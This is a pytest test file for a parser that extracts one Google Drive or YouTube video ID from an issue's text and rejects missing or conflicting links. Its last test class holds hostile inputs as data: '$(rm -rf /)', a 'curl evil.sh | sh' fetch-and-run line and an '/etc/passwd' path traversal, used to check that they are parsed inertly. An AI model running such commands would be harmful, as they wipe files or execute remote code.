import pytest

from psr.issue import ParseError, Source, parse_issue

DRIVE_ID = "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456"  # 35 碼，滿足 25+ 的裸 ID 門檻
OTHER_DRIVE_ID = "9ZzYyXxWwVvUuTtSsRrQqPpOoNnMm999999"
YOUTUBE_ID = "dQw4w9WgXcQ"


class TestDriveForms:
    def test_file_view_url(self):
        body = f"影片在這 https://drive.google.com/file/d/{DRIVE_ID}/view?usp=sharing 謝謝"
        assert parse_issue(body) == Source(kind="drive", id=DRIVE_ID)

    def test_open_id_url(self):
        body = f"https://drive.google.com/open?id={DRIVE_ID}"
        assert parse_issue(body) == Source(kind="drive", id=DRIVE_ID)

    def test_open_id_url_with_leading_params(self):
        body = f"https://drive.google.com/open?authuser=0&id={DRIVE_ID}"
        assert parse_issue(body) == Source(kind="drive", id=DRIVE_ID)

    def test_uc_id_url(self):
        body = f"https://drive.google.com/uc?id={DRIVE_ID}&export=download"
        assert parse_issue(body) == Source(kind="drive", id=DRIVE_ID)

    def test_bare_id(self):
        body = f"檔案 ID 是 {DRIVE_ID} 麻煩處理"
        assert parse_issue(body) == Source(kind="drive", id=DRIVE_ID)

    def test_bare_id_too_short_is_ignored(self):
        # 少於 25 碼的 token 不當作 Drive ID，因此整體找不到來源。
        with pytest.raises(ParseError, match="找不到"):
            parse_issue("random-short-token-here")


class TestYoutubeForms:
    def test_watch_url(self):
        body = f"https://www.youtube.com/watch?v={YOUTUBE_ID}"
        assert parse_issue(body) == Source(kind="youtube", id=YOUTUBE_ID)

    def test_short_url(self):
        body = f"https://youtu.be/{YOUTUBE_ID}"
        assert parse_issue(body) == Source(kind="youtube", id=YOUTUBE_ID)


class TestSameVideoIsNotConflict:
    def test_same_youtube_id_twice_different_forms(self):
        body = f"https://youtu.be/{YOUTUBE_ID} 跟 https://www.youtube.com/watch?v={YOUTUBE_ID} 是同一支"
        assert parse_issue(body) == Source(kind="youtube", id=YOUTUBE_ID)

    def test_same_drive_id_twice_different_forms(self):
        body = (
            f"https://drive.google.com/file/d/{DRIVE_ID}/view 也可以用 "
            f"https://drive.google.com/open?id={DRIVE_ID} 打開"
        )
        assert parse_issue(body) == Source(kind="drive", id=DRIVE_ID)

    def test_bare_id_and_url_form_of_same_id(self):
        body = f"備份連結 https://drive.google.com/uc?id={DRIVE_ID}，原始 ID 是 {DRIVE_ID}"
        assert parse_issue(body) == Source(kind="drive", id=DRIVE_ID)


class TestFailures:
    def test_zero_matches_fails_loudly(self):
        with pytest.raises(ParseError, match="找不到"):
            parse_issue("這個 issue 忘記貼連結了，只有文字說明。")

    def test_two_different_drive_ids_fail(self):
        body = f"{DRIVE_ID} 和 {OTHER_DRIVE_ID}"
        with pytest.raises(ParseError, match="2 支"):
            parse_issue(body)

    def test_two_different_youtube_ids_fail(self):
        body = f"https://youtu.be/{YOUTUBE_ID} 和 https://youtu.be/aaaaaaaaaaa"
        with pytest.raises(ParseError):
            parse_issue(body)

    def test_mixed_drive_and_youtube_links_fail(self):
        # 一個 Drive 連結 + 一個 YouTube 連結：即便各自只出現一次，仍是
        # 兩支不同的影片，必須直接失敗，絕不「取第一個」。
        body = f"https://drive.google.com/open?id={DRIVE_ID} 或是 https://youtu.be/{YOUTUBE_ID}"
        with pytest.raises(ParseError, match="2 支"):
            parse_issue(body)

    def test_failure_message_lists_the_conflicting_sources(self):
        body = f"https://drive.google.com/open?id={DRIVE_ID} 或是 https://youtu.be/{YOUTUBE_ID}"
        with pytest.raises(ParseError, match=f"drive:{DRIVE_ID}"):
            parse_issue(body)


class TestHostileInput:
    def test_shell_metacharacters_are_parsed_inertly(self):
        body = f"$(rm -rf /); `curl evil.sh | sh`; https://youtu.be/{YOUTUBE_ID}"
        # 只是純正則解析：危險字元原樣留在字串裡，不會被求值或執行，
        # 結果就是單純解析出那支影片。
        assert parse_issue(body) == Source(kind="youtube", id=YOUTUBE_ID)

    def test_path_traversal_attempt_is_parsed_inertly(self):
        body = f"see ../../../etc/passwd and {DRIVE_ID}"
        assert parse_issue(body) == Source(kind="drive", id=DRIVE_ID)

    def test_hostile_body_with_no_valid_source_fails_safely(self):
        body = "$(rm -rf /) && ../../etc/passwd && echo pwned"
        with pytest.raises(ParseError, match="找不到"):
            parse_issue(body)
